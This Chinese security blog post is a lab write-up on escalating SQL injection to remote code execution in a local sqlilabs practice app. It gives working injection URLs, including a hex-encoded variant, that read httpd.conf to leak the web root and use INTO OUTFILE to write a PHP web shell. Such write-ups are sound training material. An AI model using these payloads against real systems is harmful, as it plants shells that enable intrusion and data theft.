---
title: 记一次SQL注入到RCE的漏洞挖掘
url: https://www.secpulse.com/archives/199151.html
source: 安全脉搏
date: 2023-04-19
fetch_date: 2025-10-04T11:32:42.075492
---

# 记一次SQL注入到RCE的漏洞挖掘

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 记一次SQL注入到RCE的漏洞挖掘

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[HACK\_Learn](https://www.secpulse.com/newpage/author?author_id=8971)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-04-18

13,228

# 什么是SQL注入？

SQL 注入是一种针对使用 SQL（结构化查询语言）数据库的 Web 应用程序的攻击。攻击涉及将恶意 SQL 代码注入 Web 应用程序的输入字段，然后可以由应用程序的数据库执行。

SQL 注入攻击旨在利用应用程序代码中的漏洞，使攻击者能够访问敏感信息或操纵数据库。例如，攻击者可以使用 SQL 注入窃取用户凭据并修改或删除数据

所以有一个不同的场景，如果当前数据库用户有写权限，我们可以获得 RCE（远程代码执行）

# 测试开始

易受攻击的应用程序：http://localhost/sqlilabs/practice/example1.php?id=1

我要检查当前的数据库用户名以及用户是否有写权限

我将简单地调用用户函数user()来打印当前数据库的用户名

它会像那样输出

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199151-1681785446.jpeg)

所以我们必须检查用户 root 是否有写权限

```
我们将执行查询“(select group_concat(grantee,is_grantable,0x3c62723e) from information_schema.user_privileges)”
```

我得到了这样的输出

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199151-1681785447.jpeg)

所以我们现在有写入权限，我们可以使用outfile在服务器上写入

还有两件事 1：我们需要一个服务器路径 2：一个可写目录

对于路径泄露，我们可以尝试读取服务器上的配置文件，如httpd.conf 或 access\_log等 ，这取决于 我们找到httpd.conf文件的服务器 ，我们可以获得服务器路径

现在我们将使用load\_file()函数来读取“ httpd.conf”

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199151-16817854471.jpeg)

读取配置文件后我们得到了服务器路径

现在我们可以使用outfile写入以在服务器上获取 RCE

```
http://localhost/sqlilabs/practice/example1.php?id=1' and 0 union select 1,<?php system($_GET['cmd']); ?>,3 进入输出文件 '/opt/lampp/htdocs/shell.php' - +
```

如果它不起作用尝试使用十六进制编码

```
http://localhost/sqlilabs/practice/example1.php?id=1' and 0 union select 1,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e,3 into outfile '/opt/lampp/htdocs/shell.php' - +
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199151-1681785448.jpeg)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199151-1681785449.png)

**本文作者：[HACK\_Learn](newpage/author?author_id=8971)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/199151.html**](https://www.secpulse.com/archives/199151.html)

Tags: [outfile](https://www.secpulse.com/archives/tag/outfile)、[RCE](https://www.secpulse.com/archives/tag/rce)、[SQL注入](https://www.secpulse.com/archives/tag/SQL%E6%B3%A8%E5%85%A5)、[远程代码执行](https://www.secpulse.com/archives/tag/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C)

点赞：
0
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![代码审计 | Wavsep靶场审计防御](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/1686638778312.png)

  代码审计 | Wavsep靶场审计防御](https://www.secpulse.com/archives/201916.html "详细阅读 代码审计 | Wavsep靶场审计防御")
* [![Web中间件漏洞之Tomcat篇](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/1685349389686-300x155.png)

  Web中间件漏洞之Tomcat篇](https://www.secpulse.com/archives/201060.html "详细阅读 Web中间件漏洞之Tomcat篇")
* [![【零基础】SRC实用漏洞挖掘技巧-附5个漏洞实例解析](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200077-1683602931-300x191.png)

  【零基础】SRC实用漏洞挖掘技巧-附5个…](https://www.secpulse.com/archives/200077.html "详细阅读 【零基础】SRC实用漏洞挖掘技巧-附5个漏洞实例解析")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1ca91da9312f04fadf4ab539bb3cb881.png)](https://www.secpulse.com/newpage/author?author_id=8971aaa) | [HACK\_Learn ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)](https://www.secpulse.com/newpage/author?author_id=8971) | |
| 文章数：142 | 积分： 323 |
| 微信公众号：HACK学习呀 | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[2021中国国际网络安全博览会暨高峰论坛](http://www.sins-expo.com)

#### 2021-05-27

[The 2nd AutoCS 2021智能汽车信息安全大会](https://artisan-event.com/AutoCS2021/)

#### 2020-12-18

[贝壳找房2020 ICS安全技术峰会](https://www.4hou.com/tickets/bmZO)

#### 2020-12-11

[全球敏捷运维峰会（Gdevops2020）](https://www.bagevent.com/event/6243820?bag_track=AQMB)

#### 2020-12-04

[2020京麒网络安全大会](https://www.huodongxing.com/event/5569026023500)

#### 2020-11-29

[OPPO技术开放日第六期|聚焦应用与数据安全防护](https://mp.weixin.qq.com/s/kXt5PAD3bPcHUZjl6rziCw)

#### 2020-11-27

[EISS-2020企业信息安全峰会之上海站 11.27](https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx187be17d5a2961cf&redirect_uri=httpswww.bagevent.comevent6531722&response_type=code&scope=snsapi_userinfo&state=STATE#wechat_redirect)

#### 2020-09-24

[CSDI summit中国软件研发管理行业技术峰会](https://www.bagevent.com/event/csdisummit)

#### 2020-09-23

[2020中国国际智慧能源暨能源数据中心与网络信息安全装备展览会](http://www.energydataexpo.cn)

#### 2020-07-31

[EISS-2020企业信息安全峰会之北京站 | 7.31（周五线上）](http://www.anquanjia.net.cn/main/detail?postId=83)

#### 2020-04-15

[看雪.安恒 2020 KCTF 春季赛](https://ctf.pediy.com)

#### 2020-01-09

[相约本地生活安全沙龙暨白帽子颁奖典礼](https://www.bagevent.com/event/6241320)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-co...